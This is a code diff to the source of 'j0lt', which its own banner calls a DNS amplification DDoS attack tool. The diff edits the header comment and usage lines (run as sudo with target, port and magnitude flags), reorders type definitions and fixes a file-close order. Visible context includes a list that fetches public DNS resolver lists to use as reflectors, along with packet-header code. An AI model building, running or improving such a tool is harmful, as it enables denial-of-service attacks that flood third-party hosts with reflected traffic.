@@ -1,4 +1,4 @@
-/*    PRIVATE CONFIDENTIAL SOURCE MATERIALS DO NOT DISTRIBUTE
+/*      PRIVATE CONFIDENTIAL SOURCE MATERIALS DO NOT DISTRIBUTE
  *      _________  .__   __
  *     |__\   _  \ |  |_/  |_
  *     |  /  /_\  \|  |\   __\
@@ -7,30 +7,13 @@
  * \______|      \/              ddos amplification attack tool
  * ------------------------------------------------------------
  * > This is unpublished proprietary source code of spl0its-r-us
- * the-scientist
- * tofu@rootstorm.com
- * ------------------------------------------------------------
- * > Knowledge:
- * https://datatracker.ietf.org/doc/html/rfc1700    (NUMBERS)
- * https://datatracker.ietf.org/doc/html/rfc1035    (DNS)
- * https://datatracker.ietf.org/doc/html/rfc1071    (CHECKSUM)
- * https://www.rfc-editor.org/rfc/rfc768.html       (UDP)
- * https://www.rfc-editor.org/rfc/rfc760            (IP)
+ * the-scientist@rootstorm.com
  * ------------------------------------------------------------
  * > Usage: sudo ./j0lt -t <target> -p <port> -m <magnitude>
- * (the-scientist㉿rs)-[~/0day]$ gcc j0lt.c -o j0lt
- * (the-scientist㉿rs)-[~/0day]$ unshare -rn
- * (the-scientist㉿rs)-[~/0day]# ./j0lt 127.0.0.1 80 1337
+ * (the-scientist㉿rs)-$ gcc j0lt.c -o j0lt
+ * (the-scientist㉿rs)-$ sudo ./j0lt -t 127.0.0.1 -p 80 -m 1337
  * ------------------------------------------------------------
- * > What is DNS a amplification attack:
- * A type of DDoS attack in which attackers use publicly
- * accessible open DNS servers to flood a target with DNS
- * response traffic. An attacker sends a DNS lookup request
- * to an open DNS server with the source address spoofed to
- * be the target’s address. When the DNS server sends the
- * record response, it is sent to the target instead.
- * ------------------------------------------------------------
- * > The only sane place left on the internet
+ * Shouts to the only sane place left on the internet
  * irc.efnet.org #c
  */
 
@@ -123,6 +106,10 @@ typedef struct __attribute__((packed, aligned(1))) {
 #endif
 } PSEUDOHDR;
 
+typedef struct iphdr IPHEADER;
+typedef struct udphdr UDPHEADER;
+typedef HEADER DNSHEADER;
+
 #define DEFINE_INSERT_FN(typename, datatype)           \
         bool insert_##typename                         \
         (uint8_t** buf, size_t* buflen, datatype data) \
@@ -214,11 +201,6 @@ char* g_wget[ ] = {
     "https://public-dns.info/nameservers.txt",
     NULL
 };
-// END SYSTEM() AND READ() 
-
-typedef struct iphdr IPHEADER;
-typedef struct udphdr UDPHEADER;
-typedef HEADER DNSHEADER;
 
 bool
 InsertUDPHeader(uint8_t** buf, size_t* buflen, UDPHEADER* header, PSEUDOHDR* pseudoheader, const uint8_t* data);
@@ -316,9 +298,9 @@ main(int argc, char** argv)
         rewind(fptr);
     }
 
+    fclose(fptr);
     remove(g_path);
     printf("- resolv list removed from %s\n", g_path);
-    fclose(fptr);
 
     return 0;
 fail_state:
